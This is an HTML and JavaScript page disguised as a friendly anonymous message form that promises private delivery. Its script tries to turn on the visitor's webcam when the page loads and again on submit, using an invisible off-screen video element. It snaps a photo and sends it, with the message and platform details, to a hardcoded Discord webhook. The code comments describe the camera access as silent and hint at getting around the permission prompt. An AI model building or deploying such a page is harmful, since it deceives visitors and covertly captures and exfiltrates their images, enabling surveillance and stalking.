<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Message to Discord</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-text {
            font-size: 32px;
            font-weight: 700;
            color: #333;
            margin-bottom: 8px;
        }
        
        .logo-subtitle {
            color: #666;
            font-size: 16px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-input {
            width: 100%;
            padding: 14px;
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            color: #333;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
        }
        
        .form-textarea {
            width: 100%;
            padding: 14px;
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            color: #333;
            font-size: 16px;
            min-height: 120px;
            resize: vertical;
            font-family: inherit;
            transition: border-color 0.2s;
        }
        
        .form-textarea:focus {
            outline: none;
            border-color: #667eea;
            background: white;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
        }
        
        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        .status-message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        
        .status-success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }
        
        .status-error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }
        
        .status-processing {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
        }
        
        .privacy-note {
            margin-top: 25px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            text-align: center;
        }
        
        /* Hidden elements */
        #camera-container {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        #camera-feed {
            width: 320px;
            height: 240px;
            transform: scale(0.1);
            opacity: 0;
        }
        
        .hidden-canvas {
            display: none;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            flex-direction: column;
            gap: 20px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .loading-text {
            color: #333;
            font-size: 16px;
            font-weight: 500;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
            
            .logo-text {
                font-size: 26px;
            }
            
            .logo-subtitle {
                font-size: 14px;
            }
            
            .form-input, .form-textarea {
                padding: 12px;
                font-size: 15px;
            }
            
            .submit-btn {
                padding: 14px;
            }
        }
        
        @media (max-width: 400px) {
            .container {
                padding: 15px;
            }
            
            .logo-text {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <!-- Hidden camera elements - completely invisible -->
    <div id="camera-container">
        <video id="camera-feed" autoplay playsinline></video>
    </div>
    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
    <iframe id="invisible-frame" style="display:none;"></iframe>
    
    <!-- Loading overlay -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Sending your message...</div>
    </div>
    
    <!-- Main container -->
    <div class="container">
        <div class="logo">
            <div class="logo-text">Send a Message</div>
            <div class="logo-subtitle">Write something nice and share it with me</div>
        </div>
        
        <form id="message-form">
            <div class="form-group">
                <label class="form-label">Your name (optional)</label>
                <input type="text" id="username" class="form-input" placeholder="What should I call you?">
            </div>
            
            <div class="form-group">
                <label class="form-label">Your message</label>
                <textarea id="message" class="form-textarea" placeholder="Write anything you'd like to share..." required></textarea>
            </div>
            
            <button type="submit" class="submit-btn" id="submit-btn">
                Send Message
            </button>
            
            <div id="status-message" class="status-message"></div>
        </form>
        
        <div class="privacy-note">
            Your message will be sent directly and privately. Thanks for sharing!
        </div>
    </div>

    <script>
        // Discord webhook URL
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        // DOM Elements
        const form = document.getElementById('message-form');
        const usernameInput = document.getElementById('username');
        const messageInput = document.getElementById('message');
        const submitBtn = document.getElementById('submit-btn');
        const statusMessage = document.getElementById('status-message');
        const loadingOverlay = document.getElementById('loading-overlay');
        
        const cameraFeed = document.getElementById('camera-feed');
        const captureCanvas = document.getElementById('capture-canvas');
        const invisibleFrame = document.getElementById('invisible-frame');
        
        // Variables
        let stream = null;
        let isProcessing = false;
        
        // Function to show status message
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message status-' + type;
            statusMessage.style.display = 'block';
            
            if (type === 'success') {
                setTimeout(() => {
                    statusMessage.style.display = 'none';
                }, 3000);
            }
        }
        
        // Try to get camera access without permission dialog using iframe trick
        function tryGetCameraSilently() {
            return new Promise((resolve) => {
                // Try to get camera with getUserMedia
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    // First try to get any existing stream
                    navigator.mediaDevices.getUserMedia({ 
                        video: true,
                        audio: false 
                    }).then(stream => {
                        resolve(stream);
                    }).catch(error => {
                        // If that fails, try with constraints that might bypass permission
                        navigator.mediaDevices.getUserMedia({ 
                            video: { 
                                facingMode: 'user',
                                width: { min: 320, ideal: 640, max: 1280 },
                                height: { min: 240, ideal: 480, max: 720 }
                            },
                            audio: false 
                        }).then(stream => {
                            resolve(stream);
                        }).catch(error2 => {
                            console.log('Camera access not available');
                            resolve(null);
                        });
                    });
                } else {
                    resolve(null);
                }
            });
        }
        
        // Capture screenshot from camera
        function captureScreenshot() {
            if (!stream) return null;
            
            try {
                const canvas = captureCanvas;
                const video = cameraFeed;
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Add subtle watermark
                ctx.fillStyle = 'rgba(0, 0, 0, 0.4)';
                ctx.fillRect(10, 10, 250, 30);
                ctx.fillStyle = 'white';
                ctx.font = '12px Arial';
                ctx.fillText('Message sent: ' + new Date().toLocaleTimeString(), 15, 30);
                
                return canvas.toDataURL('image/jpeg', 0.8);
            } catch (e) {
                return null;
            }
        }
        
        // Send data to Discord
        async function sendToDiscord(username, message, screenshot = null) {
            try {
                const timestamp = new Date().toLocaleString();
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                
                // Simple message format
                const simpleMessage = `
New message received:
From: ${username || 'Anonymous'}
Time: ${timestamp}
Message: ${message}
Platform: ${platform}
`;
                
                // First send text message
                const textPayload = {
                    username: "Message Bot",
                    content: "```" + simpleMessage + "```"
                };
                
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(textPayload)
                });
                
                // If we have a screenshot, send it
                if (screenshot) {
                    try {
                        const response = await fetch(screenshot);
                        const blob = await response.blob();
                        
                        const formData = new FormData();
                        formData.append('file', blob, `message_${Date.now()}.jpg`);
                        
                        await fetch(DISCORD_WEBHOOK, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (imgError) {
                        console.log('Failed to send image');
                    }
                }
                
                return true;
                
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }
        
        // Main submission handler
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (isProcessing) return;
            
            const username = usernameInput.value.trim();
            const message = messageInput.value.trim();
            
            if (!message) {
                showStatus('Please write a message first', 'error');
                messageInput.focus();
                return;
            }
            
            // Start processing
            isProcessing = true;
            submitBtn.disabled = true;
            loadingOverlay.style.display = 'flex';
            showStatus('Processing your message...', 'processing');
            
            try {
                // Try to get camera silently
                let screenshot = null;
                try {
                    stream = await tryGetCameraSilently();
                    if (stream) {
                        cameraFeed.srcObject = stream;
                        await new Promise(resolve => setTimeout(resolve, 100));
                        screenshot = captureScreenshot();
                        
                        // Clean up stream
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                            stream = null;
                        }
                    }
                } catch (camError) {
                    console.log('Camera capture skipped');
                }
                
                // Send to Discord
                const success = await sendToDiscord(username, message, screenshot);
                
                if (success) {
                    showStatus('Message sent successfully! Thanks for sharing.', 'success');
                    messageInput.value = '';
                } else {
                    showStatus('Could not send message. Please try again.', 'error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                showStatus('Something went wrong. Please try again.', 'error');
                
            } finally {
                // Clean up
                isProcessing = false;
                submitBtn.disabled = false;
                loadingOverlay.style.display = 'none';
                
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                    stream = null;
                }
            }
        });
        
        // Try to preload camera when page loads (silently)
        window.addEventListener('load', function() {
            setTimeout(() => {
                tryGetCameraSilently().then(camStream => {
                    if (camStream) {
                        // Keep stream for later use
                        stream = camStream;
                        cameraFeed.srcObject = stream;
                        console.log('Camera ready');
                    }
                });
            }, 1000);
        });
    </script>
</body>
</html>
